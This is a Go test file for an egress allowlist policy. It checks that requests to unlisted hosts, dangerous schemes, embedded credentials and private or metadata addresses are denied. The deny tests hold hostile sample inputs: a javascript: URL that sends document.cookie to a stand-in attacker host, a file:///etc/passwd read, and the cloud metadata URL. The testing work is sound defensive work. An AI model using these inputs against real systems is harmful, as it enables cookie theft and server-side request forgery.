package security_test

import (
	"errors"
	"testing"

	"github.com/ChinnakornP/longtest/daemon/security"
)

func policy(t *testing.T, rules security.EgressRules) *security.EgressPolicy {
	t.Helper()
	p, err := security.NewEgressPolicy(rules)
	if err != nil {
		t.Fatalf("compile policy: %v", err)
	}
	return p
}

func TestEgressDeniesByDefault(t *testing.T) {
	p := policy(t, security.EgressRules{})
	if err := p.AllowURL("https://example.test/"); !errors.Is(err, security.ErrEgressDenied) {
		t.Fatalf("an empty allowlist permitted a request: %v", err)
	}
}

func TestEgressAllowsExactHostOnly(t *testing.T) {
	p := policy(t, security.EgressRules{Allow: []string{"demo.example.test"}})

	if err := p.AllowURL("https://demo.example.test/employees"); err != nil {
		t.Fatalf("the target host was denied: %v", err)
	}
	// A sibling subdomain is the normal place a staging deployment serves
	// user-uploaded content from, so it is not implied by the parent.
	for _, u := range []string{
		"https://uploads.demo.example.test/",
		"https://demo.example.test.attacker.test/",
		"https://attacker.test/?x=demo.example.test",
	} {
		if err := p.AllowURL(u); !errors.Is(err, security.ErrEgressDenied) {
			t.Errorf("%s should be denied, got %v", u, err)
		}
	}
}

func TestEgressRejectsDangerousSchemes(t *testing.T) {
	p := policy(t, security.EgressRules{Allow: []string{"demo.example.test"}})
	for _, u := range []string{
		"file:///etc/passwd",
		"javascript:fetch('https://attacker.test/'+document.cookie)",
		"data:text/html,<script>1</script>",
		"chrome://settings",
		"demo.example.test/no-scheme",
	} {
		if err := p.AllowURL(u); !errors.Is(err, security.ErrEgressDenied) {
			t.Errorf("%s should be denied, got %v", u, err)
		}
	}
}

func TestEgressRejectsCredentialsInAURL(t *testing.T) {
	p := policy(t, security.EgressRules{Allow: []string{"demo.example.test"}})
	if err := p.AllowURL("https://admin:hunter2@demo.example.test/"); !errors.Is(err, security.ErrEgressDenied) {
		t.Fatalf("a url with embedded credentials was allowed: %v", err)
	}
}

// The metadata service is the reason AllowPrivateNetworks is opt-in.
func TestEgressBlocksLinkLocalAndPrivateByDefault(t *testing.T) {
	p := policy(t, security.EgressRules{Allow: []string{"169.254.169.254", "10.0.0.5"}})
	for _, u := range []string{
		"http://169.254.169.254/latest/meta-data/",
		"http://10.0.0.5/",
		"http://127.0.0.1:3000/",
		"http://[::1]:3000/",
		"http://100.64.1.1/",
	} {
		if err := p.AllowURL(u); !errors.Is(err, security.ErrEgressDenied) {
			t.Errorf("%s should be denied without AllowPrivateNetworks, got %v", u, err)
		}
	}
}

// ...and the reason it exists at all: the product's pitch is testing an app
// that is only reachable from inside the customer's network.
func TestEgressAllowsPrivateWhenTheRunOptsIn(t *testing.T) {
	p := policy(t, security.EgressRules{
		Allow:                []string{"192.168.1.0/24", "127.0.0.1"},
		AllowPrivateNetworks: true,
	})
	for _, u := range []string{"http://192.168.1.20:8080/", "http://127.0.0.1:3000/"} {
		if err := p.AllowURL(u); err != nil {
			t.Errorf("%s should be allowed: %v", u, err)
		}
	}
	if err := p.AllowURL("http://192.168.2.20/"); !errors.Is(err, security.ErrEgressDenied) {
		t.Error("a host outside the allowed CIDR was permitted")
	}
}

func TestEgressSuffixRulesMustNotBeBroad(t *testing.T) {
	for _, rule := range []string{"*", ".com", ".test"} {
		if _, err := security.NewEgressPolicy(security.EgressRules{Allow: []string{rule}}); err == nil {
			t.Errorf("rule %q should have been rejected as too broad", rule)
		}
	}
	p := policy(t, security.EgressRules{Allow: []string{".example.test"}})
	if err := p.AllowURL("https://a.example.test/"); err != nil {
		t.Errorf("a legitimate suffix rule did not match: %v", err)
	}
}

// A trailing dot is the same host to a resolver, so it must be the same host
// to the policy.
func TestEgressNormalisesTheHost(t *testing.T) {
	p := policy(t, security.EgressRules{Allow: []string{"demo.example.test"}})
	for _, u := range []string{
		"https://demo.example.test./",
		"https://DEMO.Example.TEST/",
	} {
		if err := p.AllowURL(u); err != nil {
			t.Errorf("%s should be allowed: %v", u, err)
		}
	}
}

func TestTargetRulesUsesTheExactHost(t *testing.T) {
	r, err := security.TargetRules("https://demo.example.test:8443/app", false)
	if err != nil {
		t.Fatal(err)
	}
	if len(r.Allow) != 1 || r.Allow[0] != "demo.example.test" {
		t.Fatalf("unexpected rules %v", r.Allow)
	}
	if _, err := security.TargetRules("not a url at all", false); err == nil {
		t.Fatal("expected an unparseable target url to be rejected")
	}
}
